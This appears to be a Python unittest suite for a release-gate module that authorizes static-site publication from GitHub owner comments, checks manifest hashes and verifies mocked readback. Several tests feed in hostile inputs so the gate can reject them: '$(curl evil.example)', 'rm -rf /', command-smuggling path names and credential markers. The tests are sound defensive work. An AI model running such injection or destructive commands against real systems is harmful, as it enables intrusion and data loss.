"""No network/signing in this suite. Proves the reusable publication gate."""
import copy
import hashlib
import json
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).parent))
import release_gate as g


class ReleaseGateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.site = self.root / 'storybook' / 'my-project'
        self.site.mkdir(parents=True)
        (self.site / 'index.html').write_bytes(b'<h1>first published site</h1>\n')
        (self.site / 'assets').mkdir()
        (self.site / 'assets' / 'main.js').write_bytes(b"console.log('ok');\n")
        self.release_id = 'my-project-v1'
        self.release = g.make_release(self.root,self.release_id,'storybook/my-project','my-project','My Test Project','Two assets.')
        self.record = self.root / 'publishing' / 'releases' / (self.release_id + '.json')
        self.record.parent.mkdir(parents=True)
        self.record.write_text(json.dumps(self.release, ensure_ascii=False, indent=2) + '\n',encoding='utf8')
        _, self.release_hash = g.load_release(self.root, self.release_id)
        self.owner = {'id': 42, 'login': 'owner', 'type': 'User'}
        self.event = {
            'repository': {'full_name':g.REPOSITORY,'owner':self.owner},
            'sender':copy.deepcopy(self.owner),
            'action':'created','issue':{'number':g.INBOX_ISSUE},
            'comment': {'author_association':'OWNER','user':copy.deepcopy(self.owner),
                        'body':f'/publish-release {self.release_id} sha256:{self.release_hash}'}}
        self.env = {'GITHUB_EVENT_NAME':'issue_comment','GITHUB_REF':'refs/heads/main',
                    'GITHUB_ACTOR_ID':'42','GITHUB_TRIGGERING_ACTOR':'owner'}
        self.eventfile = self.root / 'event.json'

    def event_request(self, event=None, env=None):
        e = event if event is not None else self.event
        a = env if env is not None else self.env
        return g.authorize(a['GITHUB_EVENT_NAME'],e,a['GITHUB_REF'],a['GITHUB_ACTOR_ID'],a['GITHUB_TRIGGERING_ACTOR'])

    def test_inventory_is_frozen_and_sorted(self):
        x = self.release['files']
        self.assertEqual([f['path'] for f in x],['assets/main.js','index.html'])
        self.assertEqual(next(f['size'] for f in x if f['path']=='index.html'),len(b'<h1>first published site</h1>\n'))
        self.assertEqual(g.load_release(self.root,self.release_id)[0],self.release)

    def test_owner_approved_digested_release(self):
        self.assertEqual(self.event_request(),(self.release_id,self.release_hash))

    def test_stage_outputs_safe_fields_and_fixed_config(self):
        self.eventfile.write_text(json.dumps(self.event))
        output = self.root / 'gh-outputs'
        env = {**self.env,'GITHUB_OUTPUT':str(output)}
        x = g.stage(self.root,self.eventfile,env)
        self.assertEqual(x['site_name'],'my-project')
        self.assertEqual(x['file_count'],'2')
        self.assertEqual(x['directory'],'storybook/my-project')
        self.assertEqual(x['manifest_sha256'],self.release_hash)
        self.assertIn('site_name=my-project',output.read_text())
        self.assertNotIn('description=',output.read_text())
        cfg = json.loads((self.root/'.puter-publication/config.json').read_text())
        self.assertEqual(cfg['servers'],list(g.SERVERS))
        self.assertEqual(cfg['id'],'my-project')

    def test_second_project_and_unicode_title_without_workflow_change(self):
        release = g.make_release(self.root,'game-v1','storybook/my-project','arcade-game','A Game 🎮','A tiny game!')
        self.assertEqual(release['name'],'arcade-game')
        g.write_config(self.root,release)
        self.assertEqual(json.loads((self.root/'.puter-publication/config.json').read_text())['title'],'A Game 🎮')

    def test_file_changed_after_approval_is_blocked(self):
        (self.site/'index.html').write_bytes(b'tampered')
        with self.assertRaisesRegex(g.ReleaseError,'inventory differs'):
            g.load_release(self.root,self.release_id)

    def test_unlisted_file_blocks_release(self):
        (self.site/'extra.css').write_text('body{}')
        with self.assertRaisesRegex(g.ReleaseError,'inventory differs'):
            g.load_release(self.root,self.release_id)

    def test_missing_file_blocks_release(self):
        (self.site/'assets/main.js').unlink()
        with self.assertRaises(g.ReleaseError):
            g.load_release(self.root,self.release_id)

    def test_wrong_manifest_digest_rejected_before_config(self):
        self.event['comment']['body']=f'/publish-release {self.release_id} sha256:{"0"*64}'
        self.eventfile.write_text(json.dumps(self.event))
        with self.assertRaisesRegex(g.ReleaseError,'approved release-manifest SHA'):
            g.stage(self.root,self.eventfile,self.env)
        self.assertFalse((self.root/'.puter-publication').exists())

    def test_non_owner_sender_rejected(self):
        self.event['sender']={'id':44,'login':'impersonator','type':'User'}
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_non_owner_comment_rejected(self):
        self.event['comment']['user']['id']=44
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_rerun_by_other_actor_rejected(self):
        with self.assertRaises(g.ReleaseError): self.event_request(env={**self.env,'GITHUB_TRIGGERING_ACTOR':'not-owner'})

    def test_wrong_issue_rejected(self):
        self.event['issue']['number']=99
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_pr_comment_rejected(self):
        self.event['issue']['pull_request']={'url':'http://example.com'}
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_fork_repo_rejected(self):
        self.event['repository']['full_name']='other/fork'
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_not_main_rejected(self):
        with self.assertRaises(g.ReleaseError): self.event_request(env={**self.env,'GITHUB_REF':'refs/heads/test'})

    def test_wrong_action_rejected(self):
        self.event['action']='edited'
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_legacy_loopy_command_does_not_collide(self):
        self.event['comment']['body']='/publish loopy-library sha256:'+'a'*64
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_shell_injection_like_comment_rejected(self):
        self.event['comment']['body'] += '\n$(curl evil.example)'
        with self.assertRaises(g.ReleaseError): self.event_request()

    def test_invalid_release_paths_rejected(self):
        for path in ['../other','/tmp/site','.github/workflows','storybook/../my-project', 'storybook//my-project','site;rm -rf']: 
            with self.subTest(path=path),self.assertRaises(g.ReleaseError):
                g.make_release(self.root,'release-v1',path,'named','Title','Description')

    def test_invalid_site_names_rejected(self):
        for name in ['-leading','trailing-','UPPER','x'*14,'oops;echo']:
            with self.subTest(name=name),self.assertRaises(g.ReleaseError):
                g.make_release(self.root,'release-v1','storybook/my-project',name,'Title','Description')

    def test_symlinked_source_rejected(self):
        x=self.site/'link.html'
        x.symlink_to(self.site/'index.html')
        with self.assertRaisesRegex(g.ReleaseError,'symlink'):
            g.make_release(self.root,'release-v1','storybook/my-project','named','Title','Description')

    def test_symlinked_root_directory_rejected(self):
        (self.root/'linked').symlink_to(self.site,target_is_directory=True)
        with self.assertRaises(g.ReleaseError):
            g.make_release(self.root,'release-v1','linked','named','Title','Description')

    def test_dev_or_secret_files_rejected(self):
        for name in ['.env.production','server.key','private.pem']:
            p=self.site/name
            p.write_text('SECRET')
            with self.subTest(name=name),self.assertRaises(g.ReleaseError):
                g.make_release(self.root,'release-v1','storybook/my-project','named','Title','Description')
            p.unlink()

    def test_empty_site_refused(self):
        (self.site/'index.html').unlink()
        with self.assertRaisesRegex(g.ReleaseError,'index.html'):
            g.make_release(self.root,'release-v1','storybook/my-project','named','Title','Description')

    def test_unexpected_metadata_keys_refused(self):
        data = json.loads(self.record.read_text())
        data['shell']='rm -rf /'
        self.record.write_text(json.dumps(data))
        with self.assertRaisesRegex(g.ReleaseError,'schema/fields'):
            g.load_release(self.root,self.release_id)

    def test_workflow_dispatch_owner_only(self):
        event=copy.deepcopy(self.event)
        event['inputs']={'release_id':self.release_id,'manifest_sha256':self.release_hash}
        self.assertEqual(self.event_request(event,{**self.env,'GITHUB_EVENT_NAME':'workflow_dispatch'}),(self.release_id,self.release_hash))
        event['sender']['id']=99
        with self.assertRaises(g.ReleaseError):
            self.event_request(event,{**self.env,'GITHUB_EVENT_NAME':'workflow_dispatch'})

    def test_unapproved_event_type_rejected(self):
        with self.assertRaises(g.ReleaseError):
            self.event_request(env={**self.env,'GITHUB_EVENT_NAME':'pull_request'})

    def test_stale_release_manifest_digest_rejected(self):
        obj=json.loads(self.record.read_text())
        obj['title']='New title'
        self.record.write_text(json.dumps(obj))
        self.eventfile.write_text(json.dumps(self.event))
        with self.assertRaisesRegex(g.ReleaseError,'approved release-manifest SHA'):
            g.stage(self.root,self.eventfile,self.env)

    def test_publication_config_has_no_credentials(self):
        g.write_config(self.root,self.release)
        s=(self.root/'.puter-publication/config.json').read_text()
        for marker in ('nbunksec','nsec1','bunker://','privateKey','GITHUB_TOKEN'):
            self.assertNotIn(marker,s)

    def test_preexisting_release_id_not_overwritten_by_prepare(self):
        code=g.main(['--root',str(self.root),'prepare','--id',self.release_id,
                    '--directory','storybook/my-project','--name','my-project',
                    '--title','My Project','--description','New update'])
        self.assertEqual(code,1)
        self.assertEqual(g.load_release(self.root,self.release_id)[0],self.release)

    def test_manifest_payload_hash_is_deterministic(self):
        self.assertEqual(g.digest(self.record)[0],self.release_hash)
        self.assertEqual(g.digest(self.site/'index.html')[0],hashlib.sha256((self.site/'index.html').read_bytes()).hexdigest())

if __name__=='__main__': unittest.main()

class ReadbackTests(unittest.TestCase):
    """Exercise the signed-manifest GET invocation without contacting Nostr."""
    def setUp(self):
        ReleaseGateTests.setUp(self)
        self.upstream = self.root / '.nsyte-upstream'
        (self.upstream/'src').mkdir(parents=True)
        for p in (self.upstream/'src/cli.ts',self.upstream/'deno.json',self.upstream/'deno.lock'):
            p.write_text('mock only')

    def test_all_paths_are_downloaded_by_name_and_verified(self):
        args_seen=[]
        def fake_call(args, **kwargs):
            args_seen.append(args)
            path=args[args.index('get')+1]
            target=Path(args[args.index('--output')+1])
            target.write_bytes((self.site/path.lstrip('/')).read_bytes())
            from subprocess import CompletedProcess
            return CompletedProcess(args,0)
        with patch.object(g.subprocess,'run',side_effect=fake_call):
            g.verify(self.root,self.release_id,self.upstream)
        self.assertEqual(set(a[a.index('get')+1] for a in args_seen),{'/index.html','/assets/main.js'})
        self.assertTrue(all(a[a.index('--name')+1]=='my-project' for a in args_seen))
        self.assertTrue(all(a[a.index('--pubkey')+1]==g.EXPECTED_PUTER_PUBKEY for a in args_seen))

    def test_wrong_remote_blob_fails_closed(self):
        def fake_call(args, **kwargs):
            target=Path(args[args.index('--output')+1])
            target.write_bytes(b'corrupt')
            from subprocess import CompletedProcess
            return CompletedProcess(args,0)
        with patch.object(g.subprocess,'run',side_effect=fake_call),patch.object(g.time,'sleep'):
            with self.assertRaisesRegex(g.ReleaseError,'readback failed'):
                g.verify(self.root,self.release_id,self.upstream)

    def test_repeated_hashes_use_independent_download_paths(self):
        (self.site/'copy.html').write_bytes((self.site/'index.html').read_bytes())
        release=g.make_release(self.root,self.release_id,'storybook/my-project','my-project','My Test Project','Two assets.')
        self.record.write_text(json.dumps(release,ensure_ascii=False,indent=2)+'\n')
        targets=[]
        def fake_call(args, **kwargs):
            target=Path(args[args.index('--output')+1])
            targets.append(str(target))
            target.write_bytes((self.site/args[args.index('get')+1].lstrip('/')).read_bytes())
            from subprocess import CompletedProcess
            return CompletedProcess(args,0)
        with patch.object(g.subprocess,'run',side_effect=fake_call):
            g.verify(self.root,self.release_id,self.upstream)
        self.assertEqual(len(targets),3)
        self.assertEqual(len(set(targets)),3)
